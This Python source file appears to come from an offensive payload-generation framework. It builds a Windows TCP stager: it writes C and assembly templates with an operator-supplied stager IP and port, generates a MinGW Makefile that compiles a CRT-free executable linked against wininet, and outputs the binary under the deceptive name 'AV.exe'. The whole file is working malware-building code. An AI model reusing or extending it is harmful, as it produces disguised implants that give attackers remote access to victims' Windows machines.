import os
import shutil
import subprocess
import tempfile
from pathlib import Path
from core.payload_generator.windows.tcp.exe import source_files, header_files
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"


MAKE_FILE = f"""

#------------------------------------------------------------------------------
# Makefile for building AV.exe WITHOUT CRT on Linux + MinGW‑w64
#------------------------------------------------------------------------------

# Toolchain
CC      := x86_64-w64-mingw32-gcc
ASM     := nasm

# Directories (escape spaces)
SRCDIR  := src
INCDIR  := include

# Compiler flags (no CRT, no default libs)
CFLAGS  := -O2 -Wall -m64 -I"$(INCDIR)" -nostdlib -nodefaultlibs

# Assembler flags (win64 mode)
ASMFLAGS:= -f win64

# Linker flags:
#  -nostdlib -nodefaultlibs: drop CRT
#  -Wl,-e,main         : use 'main' as the PE entry point
#  -lkernel32          : pull in the kernel32 startup thunk
#  then only the WinAPI libs you actually call
LDFLAGS := -m64 \\
		   -Wl,--subsystem,console \\
		   -Wl,-e,mainCRTStartup \\
		   -lmingw32 \
		   -lkernel32 \\
		   -lwininet \\
		   -liphlpapi \\
		   -ladvapi32 \\
		   -luser32


# Discover all .c and .asm files
ALL_C    := $(wildcard $(SRCDIR)/*.c)

CACHE_CLEAR  := $(filter-out $(SRCDIR)/__cached__.c,$(ALL_C))

CSRC  := $(filter-out $(SRCDIR)/__file__.c,$(CACHE_CLEAR))

ASMSRC  := $(wildcard $(SRCDIR)/*.asm)

# Produce object lists
COBJ    := $(CSRC:%.c=%.o)
AOBJ    := $(ASMSRC:%.asm=%.o)
OBJ     := $(COBJ) $(AOBJ)

# Final binary
TARGET  := AV.exe

.PHONY: all clean

all: $(TARGET)

# Compile C → .o (no CRT)
$(SRCDIR)/%.o: $(SRCDIR)/%.c
	@echo "[CC] $<"
	$(CC) $(CFLAGS) -c $< -o $@

# Assemble .asm → .o
$(SRCDIR)/%.o: $(SRCDIR)/%.asm
	@echo "[ASM] $<"
	$(ASM) $(ASMFLAGS) $< -o $@

# Link into a standalone PE with entry at main()
$(TARGET): $(OBJ)
	@echo "[LD] $@"
	$(CC) -m64 $^ -o $@ $(LDFLAGS)

clean:
	@echo "[CLEAN]"
	rm -f $(SRCDIR)/*.o $(TARGET)
"""

def dump_templates(tmp: Path, stager_ip: str, stager_port: int):
	"""Create src/ and include/ and write everything out."""
	src = tmp / "src"
	inc = tmp / "include"
	src.mkdir()
	inc.mkdir()

	# Write Makefile
	(tmp / "Makefile").write_text(MAKE_FILE.lstrip(), encoding="utf-8")

	# Write headers: any top‐level var in header_files ending in _H
	for name, content in vars(header_files).items():
		if "__" not in name and isinstance(content, str):
			path = inc / f"{name}.h"
			path.write_text(content.lstrip(), encoding="utf-8")

	main_code = source_files.build_main(stager_ip, stager_port)
	(src / "main.c").write_text(main_code.lstrip(), encoding="utf-8")

	# Write sources: any top‐level var in source_files ending in _C or _ASM
	for name, content in vars(source_files).items():
		if name in ("MAIN_C", "build_main"):
			continue

		if name.endswith("_ASM") and "__" not in name and isinstance(content, str):
			path = src / f"{name[:-4].lower()}.asm"
			path.write_text(content.lstrip(), encoding="utf-8")

		elif name.endswith("_C") and name != "MAIN_C" and "__" not in name and isinstance(content, str):
			path = src / f"{name[:-2].lower()}.c"
			path.write_text(content.lstrip(), encoding="utf-8")

	return True

def build(output_path: Path, payload: str, stager_ip: str, stager_port: int):
	# 1) Create temp workspace
	tempdir = Path(tempfile.mkdtemp(prefix="sc_build_"))
	try:
		dump = dump_templates(tempdir, stager_ip, stager_port)
		if dump:

			# 2) Run make
			subprocess.run(["make"], cwd=tempdir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

			# 3) Copy AV.exe out
			shutil.copy(tempdir / "AV.exe", output_path)
			print(brightgreen + f"Built AV.exe → {output_path}")
			return True

	finally:
		# 4) Cleanup
		shutil.rmtree(tempdir)